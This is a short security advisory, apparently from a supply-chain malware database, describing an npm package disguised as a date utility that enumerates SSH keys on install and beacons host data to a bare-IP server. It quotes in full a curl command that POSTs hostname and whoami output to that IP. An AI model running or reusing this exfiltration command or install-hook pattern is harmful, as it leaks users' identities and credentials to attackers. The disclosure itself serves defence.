summary: Cover-story date utility ships SSH key enumerator and hostname exfiltration to bare-IP C2 124.221.154.135
details: Package self-describes as 'A simple date formatting utility' and exports a one-line formatDate wrapper, but the tarball ships postinstall.js which enumerates the installer's ~/.ssh directory, collects os.userInfo().username and platform, and POSTs the data to https://124.221.154.135/post (bare-IP C2). The file's own comments identify it as a C2 exfiltration channel ('向 C2 服务器发送数据'). Additionally, package.json scripts.build runs `curl -X POST --data "h=$(hostname)&u=$(whoami)" http://124.221.154.135/pre`, sending host identity to the same attacker IP over plaintext HTTP whenever a consumer runs `npm run build`. The cover-story metadata + SSH enumerator + hostname/username beacon to a bare IP is the standard supply-chain malware shape.

cwes.description: The product contains code that appears to be malicious in nature.
cwes.name: Embedded Malicious Code
